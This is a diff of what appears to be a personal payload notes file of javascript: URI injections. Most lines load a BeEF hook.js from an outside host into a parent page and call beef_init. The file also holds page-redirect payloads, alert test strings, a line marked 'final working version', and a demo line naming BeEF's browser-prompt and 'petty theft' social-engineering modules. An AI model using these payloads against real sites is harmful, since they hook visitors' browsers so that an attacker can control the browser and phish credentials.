@@ -1,3 +1,35 @@
+//default
+javascript:alert('uh oh');//
+
+//redirect
+javascript:this.parent.location='https://vim.rtorr.com/';//
+
+//beef
+javascript:(function(d,s,id){var js, fjs=d.getElementsByTagName(s)[0];if(d.getElementById(id)){return;}js=d.createElement(s);js.id=id;js.onload=function(){window.parent.beef_init();};js.src='//172.16.32.144:3000/hook.js';js.type='text/javascript';fjs.parentNode.insertBefore(js,fjs);}(this.parent.document,'script','v1beefhook1'));//
+
+javascript: (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) {
+        return;
+    }
+    js = d.createElement(s);
+    js.id = id;
+    js.onload = function() {
+        window.parent.beef_init();
+    };
+    js.src = '//172.16.32.144:3000/hook.js';
+    js.type = 'text/javascript';
+    fjs.parentNode.insertBefore(js, fjs);
+}(this.parent.document, 'script', 'v1beefhook1')); //
+
+
+demo:  
+cmd > browser > hooked domain > prompt
+cmd > social engineering > petty theft
+
+------------------------------
+
+
 javascript:var x = this.document.body.createElement('script');x.setAttribute('src', 'http://172.16.32.144:3000/hook.js');this.parent.document.head.appendChild(x);//
 
 javascript:(function(){alert('hello');})(this.parent);//
@@ -31,14 +63,9 @@ javascript:(function(d, s, id){var js, fjs = d.getElementsByTagName(s)[0];if (d.
 
 javascript:(function(d, s, id){var js, fjs = d.getElementsByTagName(s)[0];if (d.getElementById(id)){ return; }js = d.createElement(s); js.id = id;js.onload = function(){alert('loaded');};js.src = '//172.16.32.144:3000/hook.js';js.type='text/javascript';fjs.parentNode.insertBefore(js, fjs);}(this.parent.document, 'script', 'v1beefhook1'));setTimeout(function() { alert('initializing'); }, 4000);//
 
-
 //final working version.  needs touch ups.
 javascript:(function(d, s, id){var js, fjs = d.getElementsByTagName(s)[0];if (d.getElementById(id)){ return; }js = d.createElement(s); js.id = id;js.onload = function(){window.parent.beef_init();};js.src = '//172.16.32.144:3000/hook.js';js.type='text/javascript';fjs.parentNode.insertBefore(js, fjs);}(this.parent.document, 'script', 'v1beefhook1'));//
 
-//touchups
-javascript:(function(d,s,id){var js, fjs=d.getElementsByTagName(s)[0];if(d.getElementById(id)){return;}js=d.createElement(s);js.id=id;js.onload=function(){window.parent.beef_init();};js.src='//172.16.32.144:3000/hook.js';js.type='text/javascript';fjs.parentNode.insertBefore(js,fjs);}(this.parent.document,'script','v1beefhook1'));//
 
-//redirect
-javascript:this.parent.location='http://www.codepen.io/';//
 
 
